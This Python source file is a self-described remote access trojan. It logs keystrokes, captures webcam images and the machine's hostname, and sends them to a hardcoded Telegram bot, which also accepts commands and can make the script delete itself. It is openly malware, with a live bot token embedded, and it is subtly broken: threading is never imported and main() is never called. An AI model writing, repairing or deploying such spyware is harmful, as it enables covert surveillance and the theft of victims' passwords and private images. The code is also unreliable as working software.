import os
import subprocess
import time
import requests
import pynput.keyboard
import cv2
import numpy as np
from PIL import ImageGrab
from io import BytesIO

# Telegram bot credentials
BOT_TOKEN = '7762882003:AAEd-f6HrRWV0BQpotXAi5DxWRS9v0aKAaw'
CHAT_ID = '7980602481'
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# For keylogger
keystrokes = []
keylogger_active = True

# Time intervals for sending data (1 minute, 2 minutes)
KEYPRESS_INTERVAL = 60  # Send keypresses every 60 seconds
CAMERA_INTERVAL = 120   # Send camera snapshot every 120 seconds

# Last update check for Telegram
LAST_UPDATE_ID = None

# Function to send Telegram messages
def send_message(text):
    requests.post(f"{API_URL}/sendMessage", data={'chat_id': CHAT_ID, 'text': text})

# Function to send an image to Telegram
def send_image(image):
    _, img_encoded = cv2.imencode('.jpg', image)
    img_bytes = img_encoded.tobytes()
    files = {'photo': ('image.jpg', BytesIO(img_bytes), 'image/jpeg')}
    requests.post(f"{API_URL}/sendPhoto", data={'chat_id': CHAT_ID}, files=files)

# Keylogger listener
def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        keystrokes.append(str(key))

# Function to capture webcam image
def capture_image():
    cap = cv2.VideoCapture(0)  # 0 is default webcam ID
    ret, frame = cap.read()
    cap.release()
    return frame

# Function to handle sending keystrokes and webcam images
def handle_periodic_tasks():
    global keystrokes
    while True:
        if keystrokes:
            send_message(f"Keystrokes:\n{''.join(keystrokes)}")
            keystrokes = []  # Reset after sending
        time.sleep(KEYPRESS_INTERVAL)

        # Capture and send webcam image every 2 minutes
        if int(time.time()) % CAMERA_INTERVAL == 0:
            img = capture_image()
            send_image(img)
        time.sleep(1)

# Function to monitor Telegram commands (start, exit)
def get_updates():
    global LAST_UPDATE_ID
    params = {'timeout': 100, 'offset': LAST_UPDATE_ID}
    res = requests.get(f"{API_URL}/getUpdates", params=params)
    return res.json()

# Function to remove the RAT and exit gracefully
def remove_rat():
    send_message("🛑 RAT is being removed. Exiting...")
    os.remove('/home/user/telegram_rat.py')
    exit()

def main():
    global LAST_UPDATE_ID
    
    # Start keylogger listener
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    # Send message indicating RAT is online
    send_message("💻 RAT Online: Connected to " + subprocess.getoutput("hostname"))
    
    # Main loop to handle updates from Telegram
    while True:
        updates = get_updates()
        if 'result' in updates:
            for item in updates['result']:
                LAST_UPDATE_ID = item['update_id'] + 1
                message = item.get('message')
                if message and str(message['chat']['id']) == CHAT_ID:
                    command = message.get('text')
                    if command.lower() == '/start':
                        send_message("✅ RAT Online. Type 'exit' to remove and stop.")
                    elif command.lower() == 'exit':
                        remove_rat()
                    else:
                        send_message(f"Unknown Command: {command}")
        time.sleep(3)

# Start the periodic task handling (keystrokes and webcam)
if __name__ == '__main__':
    main_thread = threading.Thread(target=handle_periodic_tasks)
    main_thread.start()